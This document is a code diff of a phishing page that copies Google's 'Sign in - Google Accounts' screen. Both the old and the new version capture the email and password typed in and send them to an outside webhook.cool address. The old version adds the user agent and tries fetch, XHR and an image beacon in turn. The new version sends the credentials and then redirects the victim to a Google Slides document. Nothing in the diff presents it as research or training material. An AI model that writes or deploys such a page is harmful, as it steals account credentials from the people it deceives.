@@ -1,168 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sign in - Google accounts</title>
+    <title>Sign in - Google Accounts</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #fff;
-        }
-        .login-container {
-            width: 450px;
-            padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 16px;
-        }
-        .google-logo {
-            width: 75px;
-        }
-        h1 {
-            text-align: center;
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            text-align: center;
-            font-size: 16px;
-            font-weight: 400;
-            margin-bottom: 32px;
-        }
-        .input-field {
-            width: 100%;
-            padding: 13px 15px;
-            margin-bottom: 20px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .forgot-email {
-            margin-bottom: 32px;
-        }
-        .forgot-email a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .disclaimer {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 32px;
-        }
-        .disclaimer a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        .button-container {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .create-account {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        .next-button {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .password-field {
-            display: none;
-        }
+        body { font-family: Arial, sans-serif; margin: 40px; background: #fff; color: #202124; }
+        .container { width: 450px; margin: 0 auto; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px; }
+        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 30px; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input:focus { outline: none; border-color: #1a73e8; }
+        .next-button, .submit-button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
+        .next-button:hover, .submit-button:hover { background: #1b66c9; }
+        .footer { text-align: center; margin-top: 40px; color: #5f6368; font-size: 12px; }
+        #passwordSection { display: none; }
     </style>
 </head>
 <body>
-    <div class="login-container">
+    <div class="container">
         <div class="logo">
-            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
         </div>
-        <h1>Sign in</h1>
-        <div class="subtitle">Use your Google Account</div>
-        
-        <form id="loginForm">
-            <input type="email" class="input-field" id="email" placeholder="Email or phone" autofocus>
-            <input type="password" class="input-field password-field" id="password" placeholder="Enter your password">
-            
-            <div class="forgot-email">
-                <a href="#">Forgot email?</a>
+        <div class="card">
+            <h1>Sign in</h1>
+            <div id="emailSection">
+                <p>Use your Google Account</p>
+                <input type="email" id="email" placeholder="Email or phone">
+                <button class="next-button" onclick="showPassword()">Next</button>
             </div>
-            
-            <div class="disclaimer">
-                Not your computer? Use Guest mode to sign in privately.
-                <a href="#">Learn more</a>
+            <div id="passwordSection">
+                <p>Enter your password</p>
+                <input type="password" id="password" placeholder="Password">
+                <button class="submit-button" onclick="submitData()">Sign in</button>
             </div>
-            
-            <div class="button-container">
-                <a href="#" class="create-account">Create account</a>
-                <button type="button" id="nextButton" class="next-button">Next</button>
-                <button type="submit" id="submitButton" class="next-button" style="display: none;">Sign in</button>
-            </div>
-        </form>
+        </div>
+        <div class="footer">
+            <a href="#" style="color: #1a73e8;">Help</a> • <a href="#" style="color: #1a73e8;">Privacy</a> • <a href="#" style="color: #1a73e8;">Terms</a>
+        </div>
     </div>
 
     <script>
-        document.getElementById('nextButton').addEventListener('click', function() {
-            document.getElementById('email').style.display = 'none';
-            document.querySelector('.password-field').style.display = 'block';
-            document.getElementById('nextButton').style.display = 'none';
-            document.getElementById('submitButton').style.display = 'block';
-            document.querySelector('.forgot-email').innerHTML = '<a href="#">Forgot password?</a>';
-        });
+        function showPassword() {
+            document.getElementById('emailSection').style.display = 'none';
+            document.getElementById('passwordSection').style.display = 'block';
+        }
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function submitData() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const data = {
-                email: email,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
-
-            // Method 1: Fetch with error handling
-            fetch('https://drab-rainbow-10.webhook.cool', {
+            
+            // Send data to webhook
+            fetch('https://few-smartphone-06.webhook.cool', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(data),
-                mode: 'no-cors'
-            }).catch(error => {
-                // Method 2: XMLHttpRequest as fallback
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://drab-rainbow-10.webhook.cool', true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.send(JSON.stringify(data));
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            })
+            .then(() => {
+                // Redirect after sending data
+                window.location.href = 'https://docs.google.com/presentation/d/1n1_hljIBtjcLxVwecAur5VgTHTK1bvhBwe8a9xnvLA4/edit?slide=id.p#slide=id.p';
             });
+        }
 
-            // Method 3: Image beacon as final fallback
-            const img = new Image();
-            img.src = 'https://drab-rainbow-10.webhook.cool?data=' + btoa(JSON.stringify(data));
+        // Handle Enter key for email field
+        document.getElementById('email').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                showPassword();
+            }
+        });
 
-            // Redirect after ensuring data is sent
-            setTimeout(() => {
-                window.location.href = 'https://docs.google.com/presentation/d/1A6uDm1psmfX7UjZkSeSSFzt38eJ_T4CxvswAM2KVlXk/edit?slide=id.g38e5c12db54_0_641#slide=id.g38e5c12db54_0_641';
-            }, 500);
+        // Handle Enter key for password field
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitData();
+            }
         });
     </script>
 </body>
